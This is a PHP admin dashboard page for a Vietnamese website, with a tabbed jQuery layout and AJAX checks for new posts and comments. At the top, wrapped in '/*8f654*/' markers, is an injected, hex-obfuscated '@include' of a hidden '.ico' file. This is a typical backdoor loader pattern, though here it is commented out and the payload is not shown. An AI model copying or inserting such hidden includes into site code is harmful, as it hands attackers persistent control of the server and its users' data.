<?php
/*8f654*/

// @include "\x2fh\x6fm\x65/\x77e\x62v\x65t\x69n\x68/\x64o\x6da\x69n\x73/\x74h\x65c\x61o\x74r\x75c\x74u\x79e\x6e.\x63o\x6d/\x70u\x62l\x69c\x5fh\x74m\x6c/\x61d\x6di\x6e/\x72e\x73o\x75r\x63e\x2fs\x65c\x75r\x69t\x79/\x2ef\x377\x38d\x611\x32.\x69c\x6f";

/*8f654*/
session_start();
error_reporting(E_ALL);
//require_once("aut.php");
require_once("../functions/translate.php");
require_once("../functions/functions.php");
require_once("../classes/config.php");
require_once("../classes/database.php");
require_once("resource/security/functions.php");
checklogged("login.php");

$framemainsrc 			= 'blank.htm';
$db_language			= new db_query("SELECT tra_text,tra_keyword FROM admin_translate");
$langAdmin 				= array();
while($row=mysql_fetch_assoc($db_language->result)){
	$langAdmin[$row["tra_keyword"]] = $row["tra_text"];
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Administrator Website</title>
<link href="resource/css/jquery-ui.css" rel="stylesheet" type="text/css" media="screen" />
<link href="resource/css/layout.css" rel="stylesheet" type="text/css" media="screen" />

<script src="resource/js/jquery.js" type="text/javascript"></script>
<script src="resource/js/jquery-ui.js" type="text/javascript"></script>
<script src="resource/js/jquery.layout.js" type="text/javascript"></script>

<script language="JavaScript">
function calcHeight() {
	var height = $("#RightPane").height() - $(".ui-tabs-nav").height();
	$("#RightPane iframe").height(height);
}

function reload(id) {
	document.getElementById(id).src = document.getElementById(id).src;
}

$(function() {
	
	// Set height home
	$(window).load(function(){
		$("#test-list").css('height', $("#LeftPane").height() - 300);
	})	

	// LeftPanel - Sort able
	$("#test-list").sortable({
		handle: '.handle',
		update: function() {
			var order = $('#test-list').sortable('serialize');
			$.ajax({
				url: "resource/process-sortable.php",
				type: "post",
				data: order,
				error: function() {
					alert("Lỗi load dữ liệu");
				}
			});
			//alert(order);
			$("#info").load("process-sortable.php?"+order);
		}
	});


	// Layout
	myLayout = $('body').layout({
		applyDefaultStyles: false,
		north__showOverflowOnHover: true,
		resizerClass: 'ui-state-default',
		spacing_open: 11,
		spacing_closed: 11,
		slideTrigger_open: 'mouseleave'
	});
		
	// Tabs - Right Panel
	var maintab = $('#RightPane');
	
	maintab.tabs({
		add: function(e, ui) {
			// append close thingy
			$(ui.tab).parents('li:first')
				.append('<span class="ui-tabs-close ui-icon ui-icon-close" title="Close Tab"></span>')
				.find('span.ui-tabs-close')
				.click(function() {
					maintab.tabs('remove', $('li', maintab).index($(this).parents('li:first')[0]));
				});
			// select just added tab
			maintab.tabs('select', '#' + ui.panel.id);
		}
	});
	
	// Tabs - Move
	maintab.sortable({
		items: "li"
		//axis: 'x'
	});	  

	// Open Tab
	$(".m").click(function() {
		var tab_id 			= $(this).attr('data-tab-id') || 0,
			tab_title 		= $(this).attr('data-tab-title') || "",
			elm_tab 			= "#tab_" + tab_id,
			elm_iframe_id 	= "idframe_" + tab_id,
			elm_iframe_src	= $(this).find("a").attr("href");
		
		var elm_tab_title = "<span class='relo hide' title='Reload Tab'>&nbsp;</span>";
		if(tab_title != "") elm_tab_title += tab_title + "<span id='raquo'>&raquo;</span>";
		elm_tab_title += $(this).find("a").text()
		
		// Neu da co tab nay
		if ($(elm_tab).html() != null) {
			$("#RightPane").tabs("select", elm_tab);
			reload(elm_iframe_id);
		} 
		// Neu chua co tab thi tao tab
		else {
			$("#RightPane").tabs("add", elm_tab, elm_tab_title);
			$(elm_tab).append('<iframe id="' + elm_iframe_id + '" src="' + elm_iframe_src + '" frameborder="0" width="100%" height="100%" onload="calcHeight();"></iframe>');
		}
		
		// Reload iframe
		$(".relo").click(function() {
			reload(elm_iframe_id);	
		});
		
	});
	setInterval(function(){
	    $.ajax({
	    	type:"POST",
	    	url:"checktindang.php",
	    	data:{

	    	},success:function(data){
	    		if(data>0){
	    			$('#audio')[0].play()
	    		}
	    	}
	    });
	}, 21600000);
});
</script>
<?
	if($_SESSION["isAdmin"] == 1 || $_SESSION["admin_id"] == 30){
?>
	<script>
		var d = new Date();
		h = d.getHours();
		m = d.getMinutes();
		time = h + ':' + m;
		$.ajax({
	    	type:"POST",
	    	url:"check_comment.php",
	    	data:{

	    	},success:function(data){
	    		if(data > 0){
	    			alert('Có bình luận mới');
	    		}
	    	}
	    });
	</script>
<?	
	}
?>
</head>

<body>
	<div id="TopPane" class="ui-layout-north"><? include("resource/php/inc_header.php");?></div>

	<div id="LeftPane" class="ui-layout-west"><? include('resource/php/inc_left.php');?></div>
	
	<div id="RightPane" class="ui-layout-center">
		<ul><li><a href="#tabs-0">Trang chủ</a></li></ul>
		<div id="tabs-0">
			<iframe id="idframe_0" src="intro.php" frameborder="0" width="100%" height="100%" onload="calcHeight();"></iframe>
		</div>	
	</div>
	<audio controls id="audio" style="display: none;">
	  <source src="notifition.mp3" type="audio/mpeg">
	  Your browser does not support the audio element.
	</audio>
</body>
</html>